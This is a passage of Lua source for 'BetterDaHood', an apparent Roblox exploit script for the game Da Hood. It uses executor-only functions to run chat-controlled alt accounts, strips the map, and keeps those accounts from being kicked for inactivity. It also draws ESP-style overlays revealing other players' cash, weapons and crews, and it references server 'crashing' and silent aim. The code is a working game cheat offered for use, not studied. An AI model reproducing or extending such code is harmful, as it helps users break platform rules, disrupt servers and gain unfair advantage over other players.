        RunService:Set3dRenderingEnabled(true)
        altCommands.hidecash(nil, {"off"})
        --RunService:setThrottleFramerateEnabled(false)
    end)

    --ReturnControlBtn
    ReturnControlBtn.MouseButton1Down:Connect(function()
        AltGui.Enabled = true
        if not getgenv().safeCrashing then
            cancelVelocity(true)
        end
        RunService:Set3dRenderingEnabled(false)
        altCommands.hidecash(nil, {"on"})
        --RunService:setThrottleFramerateEnabled(true)
    end)

    --Setup
    altCommands.setup(nil, {"admin"})

    --Optimise
    setfpscap(3)
    RunService:Set3dRenderingEnabled(false)
    --RunService:setThrottleFramerateEnabled(true)
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 9e9
    settings().Rendering.QualityLevel = 1
    LPH_JIT_MAX(function()
        for _,v in ipairs(workspace:GetDescendants()) do
            if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") or v:IsA("WedgePart") then
                v.Material = "SmoothPlastic"
                v.Reflectance = 0
                if v.Name ~= "Radius" and v.Name ~= "Siren" and v.Name ~= "SNOWs_" and not v:IsA("VehicleSeat") and not v:IsDescendantOf(ITEMS_DROP) and not v:IsDescendantOf(PLAYERS_FOLDER) and not v:IsDescendantOf(SHOP) and not v:IsDescendantOf(SPAWN) and not v:IsDescendantOf(LIGHTS) and not v:IsDescendantOf(PLAYER.Character) then
                    v:Destroy()
                elseif v.Parent == SPAWN then
                    v.CanCollide = true
                elseif v.Parent == ITEMS_DROP then
                    --Platform the item drop locations
                    local platform = Instance.new("Part")
                    platform.Name = "ItemPlatform"
                    platform.Anchored = true
                    platform.Transparency = 1
                    platform.Size = Vector3.new(5, 0.1, 5)
                    platform.Position = v.Position - Vector3.new(0, 3, 0)
                    platform.Parent = SPAWN
                end
            elseif v:IsA("Decal") then
                v:Destroy()
            elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                v.Lifetime = NumberRange.new(0)
            elseif v:IsA("Explosion") then
                v.BlastPressure = 1
                v.BlastRadius = 1
            end
        end
        --Snow
        local snowSkippedFlag = false -- leave 1 snow left
        for _,v in ipairs(IGNORED:GetChildren()) do
            if v.Name == "SNOWs_" then
                if snowSkippedFlag == false then
                    snowSkippedFlag = true
                else
                    v:Destroy()
                end
            end
        end
        for _,v in ipairs(Lighting:GetDescendants()) do
            if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
                v.Enabled = false
            end
        end
    end)();
    sethiddenproperty(PLAYER, "SimulationRadius", 0)
    UserSettings().GameSettings.MasterVolume = 0
    UserSettings().GameSettings.SavedQualityLevel = 0

    --Character appearance loaded alt version
    local function characterAppearanceLoadedAltVersion(character, player)
        if player ~= PLAYER then
            --Cleanup items
            cleanupConnections[character] = character.ChildAdded:Connect(function(child)
                while child.Parent == nil do task.wait() end
                task.wait(2)
                child:Destroy()
            end)
        else
            character:WaitForChild("Humanoid"):SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
            cancelVelocity(true)
        end

        task.wait(1)
        --Destroy accessories for optimisation
        for _, v in ipairs(character:GetChildren()) do
            if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("ShirtGraphic") or v:IsA("Pants") then
                v:Destroy()
            elseif v.Name == "Head" then
                task.spawn(function()
                    local face = v:WaitForChild("face", 5)
                    if face then face:Destroy() end
                end)
            end
        end
    end

    --Function for clearing the clearup connections if necessary (for team crasher)
    getgenv().clearCleanupConnections = function()
        for character, cleanupConnection in pairs(cleanupConnections) do
            cleanupConnection:Disconnect()
            cleanupConnection = nil
        end
    end

    --Create platforms
    --Folder
    local floorPartFolder = Instance.new("Folder")
    floorPartFolder.Name = "FloorParts"
    floorPartFolder.Parent = workspace
    --Feet platform (already created, just needs parenting lol)
    feetPlatform.Parent = floorPartFolder
    --Big Floor platform
    local floorPlatform = Instance.new("Part")
    floorPlatform.Name = "BigFloorPlatform"
    floorPlatform.Anchored = true
    floorPlatform.CanCollide = true
    floorPlatform.Position = Vector3.new(-30, -450, -350)
    floorPlatform.Size = Vector3.new(2047, 1, 2047)
    floorPlatform.Parent = floorPartFolder

    --Setup platforms
    for locationName, platformInfo in pairs(SETUP_PLATFORMS) do
        local platformPart = Instance.new("Part")
        platformPart.Name = locationName.."Platform"
        platformPart.Anchored = true
        platformPart.CanCollide = true
        platformPart.Size = platformInfo.Size
        platformPart.Position = platformInfo.Position
        platformPart.Parent = floorPartFolder
    end

    --[[
    for locationName, position in pairs(ALT_SETUP_LOCATIONS_OG) do
        local floorPart = Instance.new("Part")
        floorPart.Name = locationName.."Floor"
        floorPart.Anchored = true
        floorPart.CanCollide = true
        floorPart.Size = Vector3.new(250, 1, 250)
        floorPart.Position = position + Vector3.new(0, -3, 0)
        floorPart.Parent = floorPartFolder
    end
    --]]

    --Setup shops
    for i, v in ipairs(SHOPS) do
        if REQUIRED_ITEMS[v.Name] then
            v.Head.Size = Vector3.new(10, 0.5, 10)
            v.Head.Color = Color3.fromRGB(255, 215, 0)
            v.Head.CanCollide = true
            v.Head.Transparency = 1
        else
            v:Destroy()
        end
    end


    --Setup player for alts
    --[[ METHOD FOR IF .Chatted GETS PATCHED
    messageDoneFiltering.OnClientEvent:Connect(function(message)
        local player = Players:FindFirstChild(message.FromSpeaker)
        local message = message.Message or ""

        local splitString = message:split(" ")
        local cmdName = string.lower(splitString[1]:split(".")[2])

        print("messageDoneFiltering fired")

        if altCommands[cmdName] and getgenv().mainId and player.UserId == getgenv().mainId then
            local args = {}

            for i = 2, #splitString, 1 do
                table.insert(args, splitString[i])
            end

            if FpsLockBtn.Text == "On" then
                uncapFps(60)
                task.wait(1)
                altCommands[cmdName](player, args)
                capFps()
            else
                altCommands[cmdName](player, args)
            end
        end
    end)
    ]]

    local function setupPlayerAltVersion(player)
        player.Chatted:Connect(function(message)
            local splitString = message:split(" ")
            local cmdName = string.lower(splitString[1]:split(".")[2])

            if altCommands[cmdName] and getgenv().mainId and player.UserId == getgenv().mainId then
                local args = {}
    
                for i = 2, #splitString, 1 do
                    table.insert(args, splitString[i])
                end
    
                if tonumber(FpsLockBox.Text) and tonumber(FpsLockBox.Text) < 5 then
                    uncapFps(60)
                    task.wait()
                    altCommands[cmdName](player, args)
                    capFps()
                else
                    altCommands[cmdName](player, args)
                end
            end
        end)

        while not isCharacterLoaded(player) do task.wait() end -- wait until player has loaded
        local character = player.Character

        characterAppearanceLoadedAltVersion(character, player)
        player.CharacterAdded:Connect(function(character)
            while not isCharacterLoaded(player) do task.wait() end -- wait until player has fully loaded
            characterAppearanceLoadedAltVersion(character, player)
        end)
    end

    --Incase players joined before script ran
    for _, player in ipairs(Players:GetPlayers()) do
        task.spawn(function()
            setupPlayerAltVersion(player)
        end)
    end

    --Connections
    Players.PlayerAdded:Connect(setupPlayerAltVersion)

    --Anti-afk
    PLAYER.Idled:Connect(function()
        VirtualUser:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
        task.wait(1)
        VirtualUser:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    end)
else ------------------------------------------------------------------------------------- BDH PLAYERS / CONTROLLER -------------------------------------------------------------------------------------
    --Vars
    local commands = {}
    local thugMode = false
    local silentAim = false
    local appearanceModel = Players:GetCharacterAppearanceAsync(3525801692)
    appearanceModel.Name = "Thug"
    appearanceModel.Parent = ReplicatedStorage

    --Setup for main player
    local mousePosPartsFolder = Instance.new("Folder")
    mousePosPartsFolder.Name = "MousePosPartsFolder"
    mousePosPartsFolder.Parent = workspace

    setfpscap(60)

    --Chat gui setup
    task.spawn(function()
        local scroller = PLAYER_GUI:WaitForChild("Chat"):WaitForChild("Frame"):WaitForChild("ChatChannelParentFrame"):WaitForChild("Frame_MessageLogDisplay"):WaitForChild("Scroller")
        scroller.ChildAdded:Connect(function(msgFrame)
            local nameBtn = msgFrame:WaitForChild("TextLabel"):WaitForChild("TextButton")
            local playerName = string.gsub(string.gsub(string.gsub(nameBtn.Text, "[", ""), "]", ""), ":", "")
            print(playerName)


        end)
    end)

    --Create onscreen ui


    --Create LowGfx gui
    --LowGfx UI
    local LowGfxScreenGui = CORE_GUI:FindFirstChild("LowGfxScreenGui")
    local ReturnBtn
    if not LowGfxScreenGui then
        --LowGfxScreenGui (of 'ScreenGui' class)
		LowGfxScreenGui = Instance.new("ScreenGui")
		LowGfxScreenGui.Name = "LowGfxScreenGui"
        LowGfxScreenGui.Enabled = false
		LowGfxScreenGui.IgnoreGuiInset = true
		LowGfxScreenGui.Parent = CORE_GUI

		--Create instances
		local LowGfxBackground = Instance.new("Frame")
		local LowGfxTitle = Instance.new("TextLabel")
		local LGFXUIGradient = Instance.new("UIGradient")
		local LowGfxDesc = Instance.new("TextLabel")
		ReturnBtn = Instance.new("TextButton")

		--Set attributes
		LPH_JIT_MAX(function()
			LowGfxBackground.Name = "LowGfxBackground"
			LowGfxBackground.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
			LowGfxBackground.BackgroundColor3 = Color3.new(1, 1, 1)
			LowGfxBackground.Size = UDim2.new(1, 0, 1, 0)
			LowGfxBackground.Parent = LowGfxScreenGui
			LowGfxTitle.Name = "LowGfxTitle"
			LowGfxTitle.LayoutOrder = 1
			LowGfxTitle.TextTransparency = 0.7799999713897705
			LowGfxTitle.TextStrokeTransparency = 0.75
			LowGfxTitle.AnchorPoint = Vector2.new(0.5, 0.5)
			LowGfxTitle.Size = UDim2.new(0.5, 0, 0.075, 0)
			LowGfxTitle.TextColor3 = Color3.new(1, 1, 1)
			LowGfxTitle.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
			LowGfxTitle.Text = "BetterDaHood"
			LowGfxTitle.TextSize = 14
			LowGfxTitle.Font = Enum.Font.SourceSans
			LowGfxTitle.BackgroundTransparency = 1
			LowGfxTitle.Position = UDim2.new(0.5, 0, 0.5, 0)
			LowGfxTitle.TextScaled = true
			LowGfxTitle.BackgroundColor3 = Color3.new(1, 1, 1)
			LowGfxTitle.Parent = LowGfxBackground
			LGFXUIGradient.Name = "LGFXUIGradient"
			LGFXUIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.new(0, 0, 0)),ColorSequenceKeypoint.new(1, Color3.new(0.176471, 0.176471, 0.176471)),}
			LGFXUIGradient.Rotation = 290
			LGFXUIGradient.Parent = LowGfxBackground
			LowGfxDesc.Name = "LowGfxDesc"
			LowGfxDesc.LayoutOrder = 1
			LowGfxDesc.TextTransparency = 0.7799999713897705
			LowGfxDesc.TextStrokeTransparency = 0.75
			LowGfxDesc.AnchorPoint = Vector2.new(0.5, 0.5)
			LowGfxDesc.Size = UDim2.new(0.5, 0, 0.029, 0)
			LowGfxDesc.TextColor3 = Color3.new(1, 1, 1)
			LowGfxDesc.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
			LowGfxDesc.Text = "discord.gg/betterdahood"
			LowGfxDesc.TextSize = 14
			LowGfxDesc.Font = Enum.Font.SourceSans
			LowGfxDesc.BackgroundTransparency = 1
			LowGfxDesc.Position = UDim2.new(0.5, 0, 0.55, 0)
			LowGfxDesc.TextScaled = true
			LowGfxDesc.BackgroundColor3 = Color3.new(1, 1, 1)
			LowGfxDesc.Parent = LowGfxBackground
			ReturnBtn.Name = "ReturnBtn"
			ReturnBtn.TextTransparency = 0.5
			ReturnBtn.TextStrokeTransparency = 0.75
			ReturnBtn.AnchorPoint = Vector2.new(0.5, 0.5)
			ReturnBtn.Size = UDim2.new(0.079, 0, 0.05, 0)
			ReturnBtn.TextColor3 = Color3.new(1, 1, 1)
			ReturnBtn.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
			ReturnBtn.Text = "Return"
			ReturnBtn.Visible = false
			ReturnBtn.TextSize = 14
			ReturnBtn.Font = Enum.Font.SourceSans
			ReturnBtn.BackgroundTransparency = 0.5
			ReturnBtn.Position = UDim2.new(0.5, 0, 0.625, 0)
			ReturnBtn.TextScaled = true
			ReturnBtn.BackgroundColor3 = Color3.new(0, 0, 0)
			ReturnBtn.Parent = LowGfxBackground

			--Secondary instances
			local secondaryInsts = {{["ClassName"] = "UICorner", ["Parent"] = ReturnBtn, ["Properties"] = {}},}
			for _, instInfo in ipairs(secondaryInsts) do
				local inst = Instance.new(instInfo.ClassName)
				for propertyName, value in pairs(instInfo.Properties) do
					inst[propertyName] = value
				end
				inst.Parent = instInfo.Parent
			end
		end)();
    end

    ReturnBtn.Visible = true
    ReturnBtn.MouseButton1Down:Connect(function()
        commands.ultralowgfx(nil, {"off"})
    end)

    --BDH functions
    local function updateCrewCount(playerName, crewId, increment)
        if crewId == nil or crewId == "" then return end

        --Crew count
        if crews[crewId] == nil and increment > 0 then -- create new crew
            crews[crewId] = {}
            crews[crewId].MemberCount = increment
            crews[crewId].Members = {}
            crews[crewId].Members[playerName] = true

            --Setup crew info
            local crewInfo = GroupService:GetGroupInfoAsync(tonumber(crewId))
            crews[crewId].Name = crewInfo.Name
            crews[crewId].EmblemUrl = crewInfo.EmblemUrl
            crews[crewId].Loaded = true
        elseif crews[crewId] then -- crew already exists
            if increment > 0 then
                crews[crewId].Members[playerName] = true
            end

            --Count crew members
            local count = 0
            for playerName, isMember in pairs(crews[crewId].Members) do
                if isMember == true then
                    count += 1
                end
            end
            crews[crewId].MemberCount = count

            --Update crew GUIs
            for playerName, isMember in pairs(crews[crewId].Members) do
                local player = Players:FindFirstChild(playerName)
                if player == nil then return end

                task.spawn(function()
                    while not isCharacterLoaded(player) do task.wait() end -- wait until player has loaded
                    
                    local character = player.Character
                    local bdhGui = character.HumanoidRootPart:WaitForChild("BDHGui")
                    local frame = bdhGui:WaitForChild("Frame")
                    local crewIcon = frame:WaitForChild("CrewIcon")
                    local crewName = crewIcon:WaitForChild("CrewName")
                    local crewMembers = crewIcon:WaitForChild("CrewMembers")

                    if crews[crewId].MemberCount > 1 then
                        while crews[crewId].Loaded ~= true do task.wait() end -- wait for crew data to load

                        crewIcon.Visible = true
                        crewName.Text = crews[crewId].Name
                        crewIcon.Image = crews[crewId].EmblemUrl
                        crewMembers.Text = ("👥 "..crews[crewId].MemberCount)
                    else
                        crewIcon.Visible = false
                    end
                end)
            end
        end
    end

    local function thugify(character)
        --Thugify
        --Apply accessories
        --Clear old accessories + face
        for _, v in ipairs(character:GetChildren()) do
            if v:IsA("Accessory") or v:IsA("Shirt") or v:IsA("Pants") then
                v:Destroy()
            end
        end
        if character.Head:FindFirstChild("face") then character.Head.face:Destroy() end

        --Add fake shirt + pants + face
        local shirt = Instance.new("Shirt")
        shirt.ShirtTemplate = "215846550"
        shirt.Parent = character
        local pants = Instance.new("Pants")
        pants.PantsTemplate = ""
        pants.Parent = character
        local decal = Instance.new("Decal")
        decal.Name = "face"
        decal.Face = Enum.NormalId.Front
        decal.Texture = ""
        decal.Transparency = 1
        decal.Parent = character.Head

        --Add fake assets to character
        for _, v in ipairs(appearanceModel:GetChildren()) do
            if v:IsA("Accessory") then
                addAccoutrement(character, v:Clone())
            end
        end
    end

    local function updateGunBeam(player)
        local dataFolder = player:WaitForChild("DataFolder")
        local informationFolder = dataFolder:WaitForChild("Information")
        local playerCrew = informationFolder:FindFirstChild("Crew")

        if player.Character and mousePosPartsFolder:FindFirstChild(player.Name) then
            local mousePosPart = mousePosPartsFolder[player.Name]
            --Admins etc.
            if player.Name == "BetterDaHood" then -- BetterDaHood
                mousePosPart.Beam.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 215, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 215, 0))})
            elseif player.Name == "IRakung" then -- Rakung
                mousePosPart.Beam.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(87, 57, 136)), ColorSequenceKeypoint.new(1, Color3.fromRGB(87, 57, 136))})
            elseif player.Name == "Dev_0066" then -- Dev
                mousePosPart.Beam.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 37, 126)), ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 37, 126))})

            --Defaults
            elseif player == PLAYER then
                mousePosPart.Beam.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 255, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 0))})
            elseif markedPlayers[player.UserId] == true then
                mousePosPart.Beam.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 0))})
            elseif isFriend(player) or (PLAYER_CREW and playerCrew and PLAYER_CREW.Value ~= "" and playerCrew.Value ~= "" and PLAYER_CREW.Value == playerCrew.Value) then
                mousePosPart.Beam.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 153, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 153, 255))})
            else
                mousePosPart.Beam.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))})
            end

            --[[
            player.Character:GetPropertyChangedSignal("Parent"):Connect(function()
                if player.Character.Parent == nil then
                    mousePosPart:Destroy()
                end
            end)
            --]]
        end
    end

    local function updateNameGui(player)
        local dataFolder = player:WaitForChild("DataFolder")
        local informationFolder = dataFolder:WaitForChild("Information")
        local wanted = informationFolder:WaitForChild("Wanted")
        local playerCrew = informationFolder:FindFirstChild("Crew")
        local character = player.Character
        local humanoid = character.Humanoid
        local bdhGui = character.HumanoidRootPart.BDHGui
        local frame = bdhGui.Frame
        local displayNameLbl = frame.DisplayName
        local suffix = ""
        local prefix = ""

        --Default
        displayNameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        bdhGui.AlwaysOnTop = false
        bdhGui.MaxDistance = 350

        --Friends
        if isFriend(player) then
            displayNameLbl.TextColor3 = Color3.fromRGB(112, 198, 255)
            bdhGui.AlwaysOnTop = true
            bdhGui.MaxDistance = math.huge
            suffix = "🙂"..suffix
        end
        --Is in your crew
        if isInCrew(player) then
            local crewId = playerCrew.Value
            task.spawn(function()
                while crews[crewId] == nil do task.wait() end
                while crews[crewId].Loaded ~= true do task.wait() end -- wait for crew info to load
                local crewIcon = frame.CrewIcon
                local crewName = crewIcon.CrewName
                local crewMembers = crewIcon.CrewMembers
                crewIcon.Visible = true
                crewName.Text = crews[crewId].Name
                crewIcon.Image = crews[crewId].EmblemUrl
                crewMembers.Text = ("👥"..crews[crewId].MemberCount)
            end)

            displayNameLbl.TextColor3 = Color3.fromRGB(112, 198, 255)
            bdhGui.AlwaysOnTop = true
            bdhGui.MaxDistance = math.huge
            suffix = "🛡️"..suffix
        end
        --Marked player
        if markedPlayers[player.UserId] then
            displayNameLbl.TextColor3 = Color3.fromRGB(255, 0, 0)
            bdhGui.AlwaysOnTop = true
            bdhGui.MaxDistance = math.huge
            suffix = "🎯"..suffix
        end

        --Known player (star player etc.)
        if string.sub(humanoid.DisplayName, 1, 1) == "[" then
            local emoji = string.split(string.split(humanoid.DisplayName, "]")[1], "[")[2]

            if emoji == "⭐" then
                if player:IsInGroup(8068202) then
                    displayNameLbl.TextColor3 = Color3.fromRGB(255, 197, 39)
                    prefix = "["..emoji.."]"
                    bdhGui.MaxDistance = math.huge
                    bdhGui.AlwaysOnTop = true
                else
                    frame.MiscInfo.Visible = true
                    frame.MiscInfo.FakeStar.Visible = true
                end
            end
        end

        --Bounty
        if isOfficer == true and wanted.Value and tonumber(wanted.Value) > 0 then
            frame.MiscInfo.Bounty.Visible = true
            frame.MiscInfo.Visible = true
        else
            frame.MiscInfo.Bounty.Visible = false
            frame.MiscInfo.Visible = false
            for _, v in ipairs(frame.MiscInfo:GetChildren()) do
                if v:IsA("TextLabel") and v.Visible == true then
                    frame.MiscInfo.Visible = true
                    break
                end
            end
        end

        --Admins etc.
        if player.Name == "BetterDaHood" then
            prefix = "[🪐]"
            displayNameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        elseif player.Name == "mutaprogamer1" then
            prefix = "[🍆]"
            displayNameLbl.TextColor3 = Color3.fromRGB(5, 245, 21)
        elseif player.Name == "vocaltone" then
            prefix = "[🐈]"
        elseif player.Name == "IRakung" then
            prefix = "[🐈]"
            displayNameLbl.TextColor3 = Color3.fromRGB(87, 57, 136)
            displayNameLbl.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
            displayNameLbl.TextStrokeTransparency = 0.9
        elseif player.Name == "Dev_0066" then
            prefix = "[💀]"
            displayNameLbl.TextColor3 = Color3.fromRGB(0, 37, 126)
        end

        --Alt
        if isAlt(player.UserId) then
            displayNameLbl.TextColor3 = Color3.fromRGB(225, 225, 225)
            bdhGui.StudsOffset = Vector3.new(0, 2.8, 0)
            bdhGui.Size = UDim2.new(2, 90, 0.75, 55)
            bdhGui.AlwaysOnTop = true
            bdhGui.MaxDistance = math.huge
            frame.Cash.Size = UDim2.new(1, 0, 0.2, 0)
            displayNameLbl.Size = UDim2.new(1, 0, 0.25, 0)
            frame.ArmorBarBack.Visible = false
            frame.HealthBarBack.Visible = false
            frame.Weapons.Visible = false
            frame.CrewIcon.Visible = false
            frame.MiscInfo.LayoutOrder = 3
            frame.MiscInfo.Size = UDim2.new(1, 0, 0.175, 0)
            frame.MiscInfo.Visible = true
            suffix = "🖥"
        end

        updateGunBeam(player)

        displayNameLbl.Text = (prefix.." "..player.DisplayName.." "..suffix)
    end

    local function markPlayer(player, markPlayerBool)
        markedPlayers[player.UserId] = markPlayerBool
        if isCharacterLoaded(player) then
            updateNameGui(player)
        end
    end

    local function createBBGui(character)
        local player = Players:GetPlayerFromCharacter(character)
        local humanoid = character.Humanoid
        --Folders and vars
        local bodyEffects = character:WaitForChild("BodyEffects")
        local armor = bodyEffects:WaitForChild("Armor")
        local dead = bodyEffects:WaitForChild("Dead")
        local grabbed = bodyEffects:WaitForChild("Grabbed")
        local mousePos = bodyEffects:WaitForChild("MousePos")

        --Remove default health bar and name
        humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None

        --Create GUI
        --BDHGui (of 'BillboardGui' class)
        local BDHGui = Instance.new("BillboardGui")
        BDHGui.Name = "BDHGui"
        BDHGui.LightInfluence = 0
        BDHGui.MaxDistance = 200
        BDHGui.StudsOffset = Vector3.new(0, 4, 0)
        BDHGui.Size = UDim2.new(2, 150, 0.75, 90)
        BDHGui.Parent = character.HumanoidRootPart

        --Create instances
        local Frame = Instance.new("Frame")
        local DisplayName = Instance.new("TextLabel")
        local Weapons = Instance.new("Frame")
        local Food = Instance.new("ImageLabel")
        local AmmoCount = Instance.new("TextLabel")
        local ArmorBarBack = Instance.new("Frame")
        local ArmorBar = Instance.new("Frame")
        local UIListLayout = Instance.new("UIListLayout")
        local Cash = Instance.new("TextLabel")
        local CrewIcon = Instance.new("ImageLabel")
        local CrewName = Instance.new("TextLabel")
        local CrewMembers = Instance.new("TextLabel")
        local HealthBarBack = Instance.new("Frame")
        local HealthBar = Instance.new("Frame")
        local HealthLbl = Instance.new("TextLabel")
        local MiscInfo = Instance.new("Frame")
        local Macro = Instance.new("TextLabel")
        local UIListLayout_2 = Instance.new("UIListLayout")
        local RayX = Instance.new("TextLabel")
        local SwagMode = Instance.new("TextLabel")
        local ETR = Instance.new("TextLabel")
        local EnclosedEncrypt = Instance.new("TextLabel")
        local BetterDaHood = Instance.new("TextLabel")
        local FakeStar = Instance.new("TextLabel")
        local Dropping = Instance.new("TextLabel")
        local CashAura = Instance.new("TextLabel")
        local CrashBarBack = Instance.new("Frame")
        local CrashBar = Instance.new("Frame")
        local CrashLbl = Instance.new("TextLabel")
        local AFK = Instance.new("TextLabel")
        local Zapped = Instance.new("TextLabel")
        local Pluto = Instance.new("TextLabel")
        local Bounty = Instance.new("TextLabel")

        --Set attributes
        LPH_JIT_MAX(function()
            Frame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            Frame.BackgroundTransparency = 1
            Frame.BackgroundColor3 = Color3.new(1, 1, 1)
            Frame.Size = UDim2.new(1, 0, 1, 0)
            Frame.Parent = BDHGui
            DisplayName.Name = "DisplayName"
            DisplayName.LayoutOrder = 1
            DisplayName.TextTransparency = 0.15000000596046448
            DisplayName.TextStrokeTransparency = 0.6000000238418579
            DisplayName.Size = UDim2.new(1, 0, 0.25, 0)
            DisplayName.TextColor3 = Color3.new(1, 1, 1)
            DisplayName.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            DisplayName.Text = "Name loading..."
            DisplayName.TextSize = 14
            DisplayName.Font = Enum.Font.SourceSans
            DisplayName.BackgroundTransparency = 1
            DisplayName.TextScaled = true
            DisplayName.BackgroundColor3 = Color3.new(1, 1, 1)
            DisplayName.Parent = Frame
            Weapons.Name = "Weapons"
            Weapons.LayoutOrder = 4
            Weapons.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            Weapons.BackgroundTransparency = 1
            Weapons.BackgroundColor3 = Color3.new(1, 1, 1)
            Weapons.Size = UDim2.new(1, 0, 0.275, 0)
            Weapons.Parent = Frame
            Food.Name = "Food"
            Food.LayoutOrder = 999999999
            Food.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            Food.Visible = false
            Food.Image = "rbxassetid://8538360360"
            Food.BackgroundTransparency = 1
            Food.BackgroundColor3 = Color3.new(0, 0, 0)
            Food.Size = UDim2.new(0, 100, 0, 100)
            Food.Parent = Weapons
            AmmoCount.Name = "AmmoCount"
            AmmoCount.TextTransparency = 0.25
            AmmoCount.TextStrokeTransparency = 0.800000011920929
            AmmoCount.AnchorPoint = Vector2.new(1, 1)
            AmmoCount.Size = UDim2.new(0.4, 0, 0.4, 0)
            AmmoCount.TextColor3 = Color3.new(1, 1, 1)
            AmmoCount.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            AmmoCount.Text = "1"
            AmmoCount.Visible = false
            AmmoCount.TextSize = 14
            AmmoCount.Font = Enum.Font.SourceSans
            AmmoCount.BackgroundTransparency = 1
            AmmoCount.Position = UDim2.new(1, 0, 1, 0)
            AmmoCount.TextScaled = true
            AmmoCount.BackgroundColor3 = Color3.new(1, 1, 1)
            AmmoCount.Parent = Food
            ArmorBarBack.Name = "ArmorBarBack"
            ArmorBarBack.LayoutOrder = 3
            ArmorBarBack.BorderColor3 = Color3.new(0, 0, 0)
            ArmorBarBack.AnchorPoint = Vector2.new(0.5, 0)
            ArmorBarBack.BackgroundTransparency = 0.8500000238418579
            ArmorBarBack.BackgroundColor3 = Color3.new(0, 0, 0)
            ArmorBarBack.BorderSizePixel = 0
            ArmorBarBack.Size = UDim2.new(0.6, 0, 0.059, 0)
            ArmorBarBack.Parent = Frame
            ArmorBar.Name = "ArmorBar"
            ArmorBar.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            ArmorBar.AnchorPoint = Vector2.new(0, 0.5)
            ArmorBar.Position = UDim2.new(0, 0, 0.5, 0)
            ArmorBar.BackgroundColor3 = Color3.new(0, 0.615686, 1)
            ArmorBar.BorderSizePixel = 0
            ArmorBar.Size = UDim2.new(1, 0, 0.6, 0)
            ArmorBar.Parent = ArmorBarBack
            UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
            UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
            UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
            UIListLayout.Parent = Frame
            Cash.Name = "Cash"
            Cash.LayoutOrder = 2
            Cash.TextStrokeTransparency = 0.75
            Cash.Size = UDim2.new(1, 0, 0.085, 0)
            Cash.TextColor3 = Color3.new(0, 1, 0)
            Cash.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            Cash.Text = "Cash loading..."
            Cash.BackgroundTransparency = 1
            Cash.TextScaled = true
            Cash.BackgroundColor3 = Color3.new(0, 0, 0)
            Cash.Parent = Frame
            CrewIcon.Name = "CrewIcon"
            CrewIcon.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            CrewIcon.Visible = false
            CrewIcon.Image = "rbxassetid://23483225"
            CrewIcon.BackgroundTransparency = 1
            CrewIcon.BackgroundColor3 = Color3.new(1, 1, 1)
            CrewIcon.Size = UDim2.new(0.085, 0, 0.159, 0)
            CrewIcon.Parent = Frame
            CrewName.Name = "CrewName"
            CrewName.TextStrokeTransparency = 0.6000000238418579
            CrewName.Size = UDim2.new(2, 0, 0.5, 0)
            CrewName.TextColor3 = Color3.new(1, 1, 1)
            CrewName.TextXAlignment = Enum.TextXAlignment.Left
            CrewName.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            CrewName.Text = "Crew name"
            CrewName.TextSize = 14
            CrewName.Font = Enum.Font.SourceSans
            CrewName.BackgroundTransparency = 1
            CrewName.Position = UDim2.new(1.1, 0, 0, 0)
            CrewName.TextScaled = true
            CrewName.BackgroundColor3 = Color3.new(1, 1, 1)
            CrewName.Parent = CrewIcon
            CrewMembers.Name = "CrewMembers"
            CrewMembers.TextStrokeTransparency = 0.6000000238418579
            CrewMembers.Size = UDim2.new(2, 0, 0.5, 0)
            CrewMembers.TextColor3 = Color3.new(1, 1, 1)
            CrewMembers.TextXAlignment = Enum.TextXAlignment.Left
            CrewMembers.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            CrewMembers.Text = "👥1"
            CrewMembers.TextSize = 14
            CrewMembers.Font = Enum.Font.SourceSans
            CrewMembers.BackgroundTransparency = 1
            CrewMembers.Position = UDim2.new(1.1, 0, 0.5, 0)
            CrewMembers.TextScaled = true
            CrewMembers.BackgroundColor3 = Color3.new(1, 1, 1)
            CrewMembers.Parent = CrewIcon
